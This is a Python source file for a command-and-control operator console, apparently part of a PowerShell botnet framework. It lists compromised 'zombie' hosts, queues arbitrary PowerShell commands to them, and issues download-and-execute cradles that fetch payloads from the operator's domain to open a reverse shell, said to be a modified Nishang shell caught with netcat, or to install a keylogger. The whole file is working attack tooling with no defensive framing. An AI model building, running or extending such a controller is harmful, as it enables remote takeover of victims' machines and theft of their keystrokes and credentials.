import time
import socket
import listener
import bcrypt
from prettytable import PrettyTable
import threading
import urllib.request
import config

# Gets external IP
# Currently not used
# external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')




def list_zombies(socket):

	x = PrettyTable()
	x.field_names = ["id", "uuid", "hostname", "username", "IP", "constrained_language","last output", "last_check_in"]
	counter = 0
	for z in listener.zombies:
		x.add_row([counter, z.uuid, z.hostname, z.username, z.ip, z.clm, z.output_last_command,z.last_check_in])
		counter = counter + 1

	socket.send(x.get_string().encode())


# Commands entered must have quotes escaped with '\'
def execute_command(socket):
	socket.send(b'Please choose a zombie to command by specifying his id: ')
	choice = int(socket.recv(2048).decode('utf-8'))
	z = listener.zombies[choice]
	socket.send(('Zombie with uuid: '+z.uuid+' is selected.\n').encode())
	socket.send(b'Please enter powershell command to execute: ')
	command = socket.recv(2048).decode('utf-8')
	z.command_cue.append(command.strip('\n'))
	socket.send(('The following commands are cued for zombie '+z.uuid+'\n').encode())
	socket.send('COMMANDS:\n'.encode())
	for command in z.command_cue:
		socket.send((command+'\n').encode())

# Uses modified version of Nishang shell
def spawn_shell(socket):
	socket.send(b'Please choose a zombie to command by specifying his id: ')
	choice = int(socket.recv(2048).decode('utf-8'))
	z = listener.zombies[choice]
	socket.send(('Zombie with uuid: '+z.uuid+' is selected.\n').encode())
	#socket.send(b'Please enter port: ')
	#port = socket.recv(2048).decode('utf-8')
	socket.send(b'\nOpen a netcat listener on the port and IP specified in the resources/rev.txt file.')
	socket.recv(2048).decode('utf-8')
	socket.send(b'\nPress ctrl+c to exit the shell. Dont enter exit or zombie will die!!!\n')
	z.command_cue.append("IEX(New-Object Net.WebClient).downloadString((\\\"https://"+config.domain+"/rev.txt\\\"))")

# Uses C# .net code
def install_keylogger(socket):
	socket.send(b'Please choose a zombie to install keylogger by specifying his id: ')
	choice = int(socket.recv(2048).decode('utf-8'))
	z = listener.zombies[choice]
	socket.send(('Zombie with uuid: '+z.uuid+' is selected.\n').encode())
	socket.send(b'\nResults of the keylogger can be found on the zombie machine in %TEMP%\\keylogger.txt\n')
	z.command_cue.append("IEX(New-Object Net.WebClient).downloadString((\\\"https://"+config.domain+"/key.txt\\\"))")

def empty_zombie_list(socket):
	listener.zombies = []
	list_zombies(socket)

def close_socket(socket):
	socket.close()




def print_menu(socket):
	menu = """ 

0) List zombies
1) Execute command
2) Spawn shell (Does not work in Constrained Language Mode, blocks zombie probes temporarily)
3) Install Keylogger (Does not work in Constrained Language Mode)

88) Empty zombie list

99) Exit

Please enter choice: """

	socket.send(menu.encode())
	choice = int(socket.recv(2048).decode('utf-8'))
	return choice



# Thread class that handles client connection
class ClientThread(threading.Thread):
	def __init__(self,clientsocket,clientAddress):
        	threading.Thread.__init__(self)
        	self.clientsocket = clientsocket

	def run(self):
		# bcrypt password hash
		# Example hash creation (add \n to end of string)
		# password = b"super secret password\n"
		# Hash a password for the first time, with a randomly-generated salt
		# hashed = bcrypt.hashpw(password, bcrypt.gensalt())
		# print(hashed)
		hash = config.bcrypt_password_hash
		self.clientsocket.send(b'Please enter password: ')
		password = self.clientsocket.recv(2048)
		if not bcrypt.checkpw(password, hash):
			self.clientsocket.close()
		while self.clientsocket.fileno() != -1:
			choice = print_menu(self.clientsocket)
			# List zombies
			if choice == 0:
				list_zombies(self.clientsocket)
			# Execute command
			elif choice == 1:
				execute_command(self.clientsocket)
			elif choice == 2:
				spawn_shell(self.clientsocket)
			elif choice == 3:
				install_keylogger(self.clientsocket)
			elif choice == 88:
				empty_zombie_list(self.clientsocket)
			# Close socket
			elif choice == 99:
				# Exit
				close_socket(self.clientsocket)
			else:
				# Exit
				close_socket(self.clientsocket)


# Parent thread that handles creation of socket 
def start():
	# create an INET, STREAMing socket
	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	# unblock socket for reuse
	serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	# bind the socket
	serversocket.bind((config.server_bind_ip, config.server_bind_port))
	# become a server socket
	serversocket.listen(5)
	
	
	# Spawning new thread for each client connection
	while True:
		(clientsocket, address) = serversocket.accept()
		newthread = ClientThread(clientsocket,address)
		newthread.start()
